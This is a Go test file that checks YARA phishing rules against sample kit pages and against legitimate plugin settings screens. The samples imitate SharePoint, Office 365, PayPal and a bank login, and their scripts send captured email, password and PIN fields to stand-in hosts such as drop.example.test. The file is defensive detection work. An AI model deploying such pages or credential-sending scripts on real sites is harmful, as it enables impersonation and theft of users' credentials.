//go:build yara

package yara

import "testing"

// A phishing kit that posts the harvested fields with JavaScript instead of a
// form action attribute.

func TestPhishingSharepoint_JavaScriptSubmission(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<html><head><title>SharePoint - secured by Microsoft</title></head>
<body><form id="l"><input type="email" name="u"><input type="password" name="p">
<button type="button" onclick="go()">Sign in</button></form>
<script>function go(){fetch('https://collector.example.test/log.php',{method:'POST',body:new FormData(document.getElementById('l'))});}</script>
</body></html>`)
	if !hasYaraRule(s.ScanBytes(mal), "phishing_sharepoint") {
		t.Error("phishing_sharepoint gap: kit submitting through JavaScript not detected")
	}
	legit := []byte(`<div class="wrap"><h1>OneDrive backup</h1>
<p>Connect this site to OneDrive and Microsoft 365.</p>
<form method="post"><input type="password" name="onedrive_app_secret" autocomplete="off"></form>
<script>jQuery.post(ajaxurl, {action: 'onedrive_test_connection'}, function (r) { render(r); });</script></div>`)
	if hasYaraRule(s.ScanBytes(legit), "phishing_sharepoint") {
		t.Error("phishing_sharepoint FP: OneDrive backup plugin settings screen matched")
	}
}

func TestPhishingBrandFamily_JavaScriptSubmission(t *testing.T) {
	s := loadRepoYaraScanner(t)
	cases := []struct {
		rule   string
		sample string
	}{
		{
			rule: "phishing_office365",
			sample: `<html><head><title>Office 365</title></head><body>
<form id="f"><input type="password" name="passwd"></form>
<script>document.getElementById('f').addEventListener('submit', function (e) { e.preventDefault(); navigator.sendBeacon('https://drop.example.test/o365.php', new FormData(this)); });</script>
</body></html>`,
		},
		{
			rule: "phishing_paypal",
			sample: `<html><head><title>PayPal - Log in</title></head><body>
<form id="f"><input type="password" name="pw"></form>
<script>var x = new XMLHttpRequest(); x.open('POST', 'https://drop.example.test/pp.php'); x.send(new FormData(document.getElementById('f')));</script>
</body></html>`,
		},
		{
			rule: "phishing_bank_generic",
			sample: `<html><body><h1>Online banking</h1><p>Enter your account number and security code.</p>
<form id="f"><input type="password" name="pin"></form>
<script>jQuery.ajax({url: 'https://drop.example.test/bank.php', method: 'POST', data: jQuery('#f').serialize()});</script>
</body></html>`,
		},
	}
	for _, tc := range cases {
		if !hasYaraRule(s.ScanBytes([]byte(tc.sample)), tc.rule) {
			t.Errorf("%s gap: kit submitting through JavaScript not detected", tc.rule)
		}
	}

	// An SMTP plugin settings screen names the brand, takes a password, and
	// talks to its own site.
	legit := []byte(`<div class="wrap"><h1>Office 365 SMTP</h1>
<form method="post"><input type="password" name="o365_client_secret"></form>
<script>jQuery.post(ajaxurl, {action: 'o365_send_test'}, function (r) { render(r); });</script></div>`)
	if hasYaraRule(s.ScanBytes(legit), "phishing_office365") {
		t.Error("phishing_office365 FP: SMTP plugin settings screen matched")
	}
}
